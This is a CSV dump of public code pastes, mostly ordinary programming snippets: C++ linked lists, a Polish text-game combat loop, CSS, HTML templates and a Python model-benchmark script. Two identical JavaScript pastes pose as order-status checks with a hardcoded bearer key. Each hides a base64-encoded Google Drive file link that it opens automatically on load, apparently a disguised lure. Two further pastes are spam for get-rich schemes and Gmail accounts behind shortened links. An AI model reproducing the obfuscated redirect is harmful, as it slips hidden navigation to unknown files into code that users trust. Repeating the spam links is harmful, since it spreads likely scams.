id,title,username,language,date,content
WEVvS7Uu,Order.js,iLoveToWatch,JavaScript,Wednesday 2nd of April 2025 01:03:08 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/357/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
VKqu7g7r,Untitled,Josif_tepe,C++,Wednesday 2nd of April 2025 12:56:42 PM CDT,"#include <iostream>
using namespace std;


struct node {
    int info;
    node * next;
    node * prev;
};

struct DLCL {
    node * head, * tail;
    void init() {
        head = NULL;
        tail = NULL;
    }
    
    void insertFront(int x) {
        node * new_node = new node;
        new_node->info = x;
        new_node->next = NULL;
        new_node->prev = NULL;
        
        if(head == NULL) {
            head = new_node;
            tail = head;
            head->next = tail;
            tail->prev = head;
        }
        else {
            new_node->next = head;
            head->prev = new_node;
            head = new_node;
            tail->next = head;
            head->prev = tail;
        }
        
    }
    
    void insertEnd(int x) {
        node * new_node = new node;
        new_node->info = x;
        new_node->next = NULL;
        new_node->prev = NULL;
        
        if(head == NULL) {
            head = new_node;
            tail = head;
            head->prev = tail;
            tail->next = head;
        }
        else {
            tail->next = new_node;
            new_node->prev = tail;
            
            tail = new_node;
            tail->next = head;
            head->prev = tail;
        }
    }
    
    void deleteFront() {
        if(head != NULL) {
            if(head->next == head) {
                delete head;
                head = NULL;
                tail = NULL;
            }
            else {

                head = head->next;
                delete head->prev;
                head->prev = tail;
                tail->next = head;
                
            }
        }
    }
    
    void deleteEnd() {
        if(head != NULL) {
            if(head->next == head) {
                delete head;
                head = NULL;
                tail = NULL;
            }
            else {
                tail = tail->prev;
                delete tail->next;
                tail->next = head;
                head->prev = tail;
            }
        }
    }
    
    void deleteNode(int x) {
        if(head != NULL) {
            if(head->info == x) {
                deleteFront();
            }
            else {
                node * tmp = head;
                while(tmp->info != x) {
                    tmp = tmp->next;
                }
                if(tmp->next == head) {
                    deleteEnd();
                }
                else {
                    tmp->prev->next = tmp->next;
                    tmp->next->prev = tmp->prev;
                    delete tmp;
                }
            }
        }
    }
    void deleteNode(node *  x) {
        if(head != NULL) {
            if(head == x) {
                deleteFront();
            }
            else {
                node * tmp = head;
                while(tmp != x) {
                    tmp = tmp->next;
                }
                if(tmp->next == head) {
                    deleteEnd();
                }
                else {
                    tmp->prev->next = tmp->next;
                    tmp->next->prev = tmp->prev;
                    delete tmp;
                }
            }
        }
    }
    
    void inserAfter(int x, node * after) {
        node * new_node = new node;
        new_node->info = x;
        new_node->next = NULL;
        new_node->prev = NULL;
        
        if(after != NULL) {
            if(after == head) {
                insertFront(x);
            }
            else if(after == tail) {
                insertEnd(x);
            }
            else {
                
                new_node->next = after->next;
                new_node->prev = after;
                after->next = new_node;
                new_node->next->prev = new_node;
            }
        }
    }
    void print() {
        if(head != NULL) {
            node * tmp = head;
            while(tmp != tail) {
                cout << tmp->info << ""-->"";
                tmp = tmp->next;
            }
            cout << tmp->info<<""-->"";
            tmp = tmp->next;
            while(tmp != tail) {
                cout << tmp->info << ""-->"";
                tmp = tmp->next;
            }
            cout << tmp->info << endl;
            
            while(tmp != head) {
                cout << tmp->info << ""<--"";
                tmp = tmp->prev;
            }
            cout << tmp->info << ""<--"";
            tmp = tmp->prev;
            while(tmp != head) {
                cout << tmp->info << ""<--"";
                tmp = tmp->prev;
            }
            cout << tmp->info << endl;
        }
    }
    
};
int main() {
    DLCL dll;
    dll.init();
    
    dll.insertFront(1);
    dll.insertFront(2);
    dll.insertFront(3);
    
    dll.insertEnd(4);
    dll.insertEnd(5);
    dll.insertEnd(6);
    dll.print();
    
    
    node * tmp = dll.head->next;
    dll.inserAfter(7, tmp);
    
    dll.print();
    
    return 0;
}
"
QUaT5eRq,combat,drakon-firestone,C++,Wednesday 2nd of April 2025 12:53:25 PM CDT,"void start_combat()
{
	Entity enemy = Entity(""Kosmita"");
    bool combatRunning = true;
	int choice, playerDamage, enemyDamage;
    while (combatRunning)
	{
        cout << endl << ""Co chcesz zrobić?"" << endl;
        cout << ""------------------------------------------------"" << endl;
        cout << ""Twoje życie: "" << player.get_health() << "" | Życie przeciwnika: "" << enemy.get_health() << endl;
		cout << ""------------------------------------------------"" << endl;

        cout << ""[1] Atakuj!"" << endl;
        cout << ""[2] Uciekaj!"" << endl << endl;
        cout << ""Wpisz numer: "";
        cin >> choice;
        
        switch (choice)
        {
        case 1: // Gracz atakuje
        	playerDamage = rand() % player.get_damage() + 1;

            cout << player.get_name() << "" atakuje! Rani przeciwnika o "" << playerDamage << "" punkty!"" << endl;
            enemy.dealDamage(playerDamage);
                
            if(enemy.get_health() > 0)
            {
            	enemyDamage = rand() % enemy.get_damage()  + 1;
				cout << enemy.get_name() << "" kontratakuje! Rani bohatera o "" << enemyDamage << "" punkty!"" << endl;

                player.dealDamage(enemyDamage);
                if(player.get_health() <= 0)
                {
                	cout << player.get_name() << "" przegrywa! Koniec walki!"" << endl;
					combatRunning = false;
                }
            }
            else
            {
                cout << enemy.get_name() << "" przegrywa! Koniec walki!"" << endl;
                cout << player.get_name() << "" znajduje 10 metalu!"" << endl;

                player.add_metal(10);
                combatRunning = false;
            }
        	break;
                
        case 2: // Gracz ucieka
            cout << player.get_name() << "" ucieka tracąc kolejne 5% tlenu! Koniec walki!"" << endl;
            player.change_oxygen(-5);
            combatRunning = false;
            break;

        }
    }
}"
fi5LDFbn,Random Gmail Acc 1A,Thelapse,JavaScript,Wednesday 2nd of April 2025 12:52:45 PM CDT," 
Pdf https://tinyurl.com/methodssss


tl8wH8w7FM
"
09tPuJqe,Pillole video 7,fcamuso,C++,Wednesday 2nd of April 2025 12:48:22 PM CDT,"#include <iostream>
#include <chrono>
#include <vector>


using namespace std;

struct Nodo {
  string dato = """";

  Nodo *next = nullptr;
};



void ins_testa(Nodo *&il, Nodo *nuovo)
{
    nuovo->next = il;
    il = nuovo;
}



void ins_coda(Nodo *&il, Nodo *nuovo)
{
  if (il == nullptr) //lista vuota ?
  {
    nuovo->next = il;
    il = nuovo;
  }
  else
  {
    Nodo *ultimo = il;

    //otteniamo un puntatore all'ultimo nodo attuale
    while(ultimo->next != nullptr) ultimo = ultimo->next;

    ultimo->next = nuovo;
    nuovo->next = nullptr;
  }
}

void stampa_dalla_coda(Nodo *p, int profondita, int &massima)
{
  massima = max(profondita, massima);

  if (p!=nullptr)
    stampa_dalla_coda(p->next, profondita+1, massima);
}


//Equazione di ricorrenza temporale: T(n) = 2*T(n/2) + O(n)
//Equazione di ricorrenza spaziale: T(n) = T(n/2) + O(1)
//Complessità temporale: O(nlog(n))
//Complessità spaziale: O(log(n))
void stampaInvertita(Nodo *testa,int  dim){

    //Casi base
    //Lista vuota
    if (testa == nullptr)
        return;
    //Lista con un solo elemento
    if (testa->next == nullptr)
        ;//cout << testa->dato << endl;
        //Passo ricorsivo
    else{
        Nodo* attuale = testa;
        //Suddivido in due metà la lista
        for (int i = 0; i < dim/2 - 1; ++i) {
            attuale = attuale->next;
        }
        //Mi fermo all'ultimo elemento della prima metà
        //ed imposto il puntatore al successivo a nullptr, così da avere due liste fisicamente separate
        Nodo* temp = attuale;
        attuale = attuale->next;
        temp->next = nullptr;

        //Ora richiedo la stampa della seconda metà seguita dalla prima; l'ordine delle chiamate è fondamentale
        stampaInvertita(attuale, dim/2);
        stampaInvertita(testa, dim - dim/2);

        //Dopo la stampa non resta che ricongiungere le due liste precedentemente divise
        temp->next = attuale;
    }
}

//credits Alex-qk5ei (youtube)
int stampaInvertitaMisuraStack(Nodo *testa, int dim){

    //Casi base
    //Lista vuota
    if (testa == nullptr)
        return 1;
    //Lista con un solo elemento
    if (testa->next == nullptr) {
        ;//cout << testa->dato << endl;
        return 1;
    }
    //Passo ricorsivo
    else{
        Nodo* attuale = testa;

        //Suddivido in due metà la lista
        for (int i = 0; i < (dim>>1) - 1; ++i) {
            attuale = attuale->next;
        }

        //Mi fermo all'ultimo elemento della prima metà
        //ed imposto il puntatore al successivo a nullptr, così da avere due liste fisicamente separate
        Nodo* temp = attuale;
        attuale = attuale->next;
        temp->next = nullptr;

        /*La profondità massima dello stack P(n) può essere definita ricorsivamente come: P(n) = max(P(n/2), P(n-n/2)) + 1
        L'addendo 1 equivale alla presenza sullo stack del record di attivazione corrente
        Inoltre, considerando che n-n/2 >= n/2 in ogni caso, max(P(n/2), P(n-n/2)) = P(n-n/2) e, conseguentemente
        P(n) = P(n-n/2) + 1
        L'istruzione sottostante rappresenta dunque la profondità massima che andrà restituita al metodo chiamante
        */
        //Ora richiedo la stampa della seconda metà seguita dalla prima; l'ordine delle chiamate è fondamentale
        int profondita = stampaInvertitaMisuraStack(attuale, dim - (dim>>1)) + 1;
        stampaInvertitaMisuraStack(testa, dim>>1);
        //Dopo la stampa non resta che ricongiungere le due liste precedentemente divise
        temp->next = attuale;

        return profondita;
    }
}

int fattoriale(int n)
{
   if (n == 0)
    return 1;
   else
     return n * fattoriale(n - 1);
}


int fattoriale_tail(int n, int accumulatore=1)
{
   if (n == 0)
    return accumulatore;
   else
    return fattoriale_tail(n - 1, n * accumulatore);
}


enum Comando {START, STOP};
auto Cronometro(Comando comando = Comando::START)
{
  static std::chrono::time_point<std::chrono::system_clock> inizio;
  static std::chrono::time_point<std::chrono::system_clock> fine;

  if (comando == Comando::START)
  {
    inizio = chrono::high_resolution_clock::now();
    fine = inizio;
  }
  else
    fine = chrono::high_resolution_clock::now();


  return chrono::duration_cast<std::chrono::milliseconds>(fine - inizio).count();
}








void stampaInvertitaVector(Nodo *il)
{
  vector<Nodo*> v;

  while(il!=nullptr)
  {
    v.push_back(il);
    il = il-> next;
  }

  for (int i=v.size()-1; i>=0; i--);
    //cout << v[i] -> dato << "" "";
}








void InvertiLista(Nodo *&il)
{

  Nodo * precedente = nullptr;
  Nodo * corrente=il;
  Nodo * successivo = nullptr;

  while(corrente!=nullptr)
  {
    successivo = corrente->next;
    corrente->next =  precedente;

    precedente = corrente;
    corrente = successivo;
  }

  il=precedente;
}





void stampa(Nodo *p)
{
  while (p!=nullptr)
  {
    //cout << p->dato << "" "";

    //al prossimo nodo
    p = p->next;
  }
}

// Struttura per rappresentare una ""mossa""
struct HanoiMove {
    int n;          // Numero di dischi
    char from;      // Piolo di partenza (A, B, C)
    char to;        // Piolo di destinazione
    char aux;       // Piolo ausiliario
};

// Versione iterativa senza STL (stack manuale)
void hanoi_iterative_no_stl(int n, char from = 'A', char to = 'C', char aux = 'B') {
    const int MAX_STACK_SIZE = 1000; // Dimensione massima dello stack
    HanoiMove stack[MAX_STACK_SIZE];
    int top = -1; // Inizializza lo stack vuoto

    // Simula la prima chiamata ricorsiva
    stack[++top] = {n, from, to, aux};

    while (top >= 0) { // Finché lo stack non è vuoto
        HanoiMove current = stack[top--]; // Pop

        if (current.n == 1) {
            // Caso base: sposta il disco
            cout << ""Muovi disco 1 da "" << current.from << "" a "" << current.to << endl;
        } else {
            // Simula le chiamate ricorsive in ordine inverso (LIFO)
            // 1. hanoi(n-1, aux, to, from)
            stack[++top] = {current.n - 1, current.aux, current.to, current.from};
            // 2. Sposta il disco n da from a to (caso base fittizio)
            stack[++top] = {1, current.from, current.to, current.aux};
            // 3. hanoi(n-1, from, aux, to)
            stack[++top] = {current.n - 1, current.from, current.aux, current.to};
        }
    }
}


void hanoi(int n, char from = 'A', char to = 'C', char aux = 'B') {
    if (n == 1) {
        cout << ""Muovi disco 1 da "" << from << "" a "" << to << endl;
        return;
    }
    hanoi(n - 1, from, aux, to);  // Sposta n-1 dischi da 'from' a 'aux'
    cout << ""Muovi disco "" << n << "" da "" << from << "" a "" << to << endl;
    hanoi(n - 1, aux, to, from);  // Sposta n-1 dischi da 'aux' a 'to'
}

int main()
{
    //cout << fattoriale_tail(60001) << endl;
    //hanoi_iterative_no_stl(3);

    string dati_prova[] = {""abaco"", ""amo"", ""bicicletta"", ""cane"", ""canguro"", ""mare"", ""sale"", ""zebra""};

    Nodo *il = nullptr;

    int quante_run=10000;
    int num_ele = 20000;

    for (int i=0; i<num_ele; i++)
      ins_testa(il, new Nodo{dati_prova[i%8]});

    //stampaInvertitaVector(il);

//    stampa(il);
//    InvertiLista(il);
//    stampa(il);
//    InvertiLista(il);
//    stampa(il);



    //CON RICORSIONE E DIVIDE ET IMPERA
    Cronometro(Comando::START);
    for (int run=0; run<quante_run; run++)
          stampaInvertita(il,num_ele);
    cout << ""Ricorsione con divide/impera: "" << Cronometro(Comando::STOP) << endl;

    //CON VECTOR DI APPOGGIO
    Cronometro(Comando::START);
    for (int run=0; run<quante_run; run++)
          stampaInvertitaVector(il);
    cout << ""Iterativa con vector di puntatori: "" << Cronometro(Comando::STOP) << endl;


    //CON INVERSIONE PUNTATORI
    Cronometro(Comando::START);
    for (int run=0; run<quante_run; run++)
    {
      InvertiLista(il);
      stampa(il);
      InvertiLista(il);
    }
    cout << ""Iterativa con inversione fisica lista: "" << Cronometro(Comando::STOP) << endl;



    return 0;
}
"
UaMgzu6w,Untitled,s-sols,CSS,Wednesday 2nd of April 2025 12:47:24 PM CDT,":is(.d-lg-block, .d-lg-none) .swiper:not(.swiper-initialized) > .swiper-wrapper {
justify-content: center;
left: 12px;
}

:is(.d-lg-block, .d-lg-none) .swiper:not(.swiper-initialized) > .swiper-wrapper > .swiper-slide {
width: calc(100% / 7);
display: none;
}

:is(.d-lg-block, .d-lg-none) .swiper:not(.swiper-initialized) > .swiper-wrapper > .swiper-slide:nth-of-type(-n+4) {
display: block;
}
:is(.d-lg-block, .d-lg-none) .swiper:not(.swiper-initialized) > .swiper-wrapper > .swiper-slide:nth-last-of-type(-n+3) {
display: block;
}

:is(.d-lg-block, .d-lg-none) .swiper:not(.swiper-initialized) > .swiper-wrapper > .swiper-slide:nth-last-of-type(1) {
order: -1;
}

:is(.d-lg-block, .d-lg-none) .swiper:not(.swiper-initialized) > .swiper-wrapper > .swiper-slide:nth-last-of-type(2) {
order: -2;
}

:is(.d-lg-block, .d-lg-none) .swiper:not(.swiper-initialized) > .swiper-wrapper > .swiper-slide:nth-last-of-type(3) {
order: -3;
}

@media screen and (max-width: 1599px) {
:is(.d-lg-block, .d-lg-none) .swiper:not(.swiper-initialized) > .swiper-wrapper > .swiper-slide {
width: calc(100% / 6);
}
}

@media screen and (max-width: 1399px) {
:is(.d-lg-block, .d-lg-none) .swiper:not(.swiper-initialized) > .swiper-wrapper > .swiper-slide {
width: calc(100% / 5);
}
}

@media screen and (max-width: 1199px) {
:is(.d-lg-block, .d-lg-none) .swiper:not(.swiper-initialized) > .swiper-wrapper > .swiper-slide {
width: calc(100% / 4);
}
}

@media screen and (max-width: 991px) {
:is(.d-lg-block, .d-lg-none) .swiper:not(.swiper-initialized) > .swiper-wrapper {
justify-content: center;
left: 85px;
}
:is(.d-lg-block, .d-lg-none) .swiper:not(.swiper-initialized) > .swiper-wrapper > .swiper-slide {
}
}

@media screen and (max-width: 799px) {
:is(.d-lg-block, .d-lg-none) .swiper:not(.swiper-initialized) > .swiper-wrapper {
justify-content: center;
left: 60px;
}
:is(.d-lg-block, .d-lg-none) .swiper:not(.swiper-initialized) > .swiper-wrapper > .swiper-slide {
width: calc(100% / 3);
}
}"
Ez6QnRk5,Make $1000 15-MINUTES (BEGINNER) WM,Thelapse,JavaScript,Wednesday 2nd of April 2025 12:36:50 PM CDT," 
Pdf https://tinyurl.com/methodssss


OkcPRb1dum
"
dX6W82Tv,Basket Boy | กระทู้โรลเพลย์,Kelly-B9978,HTML,Wednesday 2nd of April 2025 12:35:30 PM CDT,"<!-- อาคารเรียน -->
<link href=""https://dl.dropbox.com/scl/fi/vza6zf6ohb8bp34h5z0do/basketboy.css?rlkey=6uhx3edms1l93t8x97gz261al&st=g9d9f36y"" rel=""stylesheet"">
<div id=""BasketBoy""><a href=""https://discord.com/users/625292873914515456/"" target=""_blank""></a><div class=""bkb-set"" style="""">
<div class=""bkb-head""><div class=""bkb-logo""></div>
<div class=""bkb-title"">School Building</div>
<div class=""bkb-date""><div>6 - 13</div><div>April</div></div></div>
<div class=""bkb-pic"" style=""--bkb-pic: url();""></div>
<div class=""bkb-content"">
--คำบรรยาย--
</div>
</div></div>

<!-- พื้นที่รอบนอก -->
<link href=""https://dl.dropbox.com/scl/fi/vza6zf6ohb8bp34h5z0do/basketboy.css?rlkey=6uhx3edms1l93t8x97gz261al&st=g9d9f36y"" rel=""stylesheet"">
<div id=""BasketBoy""><a href=""https://discord.com/users/625292873914515456/"" target=""_blank""></a><div class=""bkb-set"" style="""">
<div class=""bkb-head""><div class=""bkb-logo""></div>
<div class=""bkb-title"">Outdoor Area</div>
<div class=""bkb-date""><div>6 - 13</div><div>April</div></div></div>
<div class=""bkb-pic"" style=""--bkb-pic: url();""></div>
<div class=""bkb-content"">
--คำบรรยาย--
</div>
</div></div>"
1XmdCcCe,Untitled,iLoveToWatch,JavaScript,Wednesday 2nd of April 2025 12:32:23 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/426/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
waHhAZZv,latency model size compute,mayankjoin3,Python,Wednesday 2nd of April 2025 12:30:36 PM CDT,"import pandas as pd
import time
import psutil
import os
from sklearn.model_selection import StratifiedKFold
from sklearn.ensemble import ExtraTreesClassifier
from sklearn.metrics import classification_report
import joblib
from sklearn.model_selection import train_test_split
from sklearn.preprocessing import LabelEncoder
import numpy as np

# Step 1: Load the data
file_path = ""m5.csv""
df = pd.read_csv(file_path)

# Preprocessing: If categorical columns exist, encode them
label_encoder = LabelEncoder()

# Assuming 'category' column is the target and there may be categorical features
# Encode categorical features if needed, e.g., if there are string columns
# Here we will assume 'category' is the target and all other columns are features
X = df.drop(columns=['label'])
y = df['label']

# Encoding categorical features (if they exist)
X = X.apply(lambda col: label_encoder.fit_transform(col.astype(str)), axis=0, result_type='expand')

# Step 2: Initialize the ExtraTreesClassifier
clf = ExtraTreesClassifier(random_state=42, n_jobs=-1)  # n_jobs=-1 allows for parallel processing

# Step 3: Set up 2-Fold Cross-Validation
skf = StratifiedKFold(n_splits=2, shuffle=True, random_state=42)

# Step 4: Evaluate Model Using Cross-Validation
fold = 1
for train_index, test_index in skf.split(X, y):
    print(f""Fold {fold}..."")
    X_train, X_test = X.iloc[train_index], X.iloc[test_index]
    y_train, y_test = y.iloc[train_index], y.iloc[test_index]

    # Step 5: Train the model
    start_time = time.time()
    clf.fit(X_train, y_train)
    training_time = time.time() - start_time
    print(f""Training time for fold {fold}: {training_time:.4f} seconds"")

    # Step 6: Test the model and measure latency
    start_time = time.time()
    predictions = clf.predict(X_test)
    prediction_time = time.time() - start_time
    print(f""Prediction time for fold {fold}: {prediction_time:.4f} seconds per instance"")

    # Step 7: Memory and CPU Usage during prediction
    process = psutil.Process(os.getpid())
    memory_before = process.memory_info().rss / (1024 * 1024)  # in MB
    cpu_before = psutil.cpu_percent(interval=1)

    # Perform prediction to measure CPU and Memory usage
    clf.predict(X_test)

    memory_after = process.memory_info().rss / (1024 * 1024)  # in MB
    cpu_after = psutil.cpu_percent(interval=1)

    memory_usage = memory_after - memory_before
    cpu_usage = cpu_after - cpu_before

    print(f""Memory usage during prediction: {memory_usage:.4f} MB"")
    print(f""CPU usage during prediction: {cpu_usage:.4f}%"")

    # Step 8: Output classification report
    # print(""Classification Report:"")
    # print(classification_report(y_test, predictions))

    # Step 9: Model size on disk
    model_filename = f'extratrees_model_fold{fold}.pkl'
    joblib.dump(clf, model_filename)
    model_size = os.path.getsize(model_filename) / (1024 * 1024)  # in MB
    print(f""Model size for fold {fold}: {model_size:.4f} MB"")

    fold += 1
"
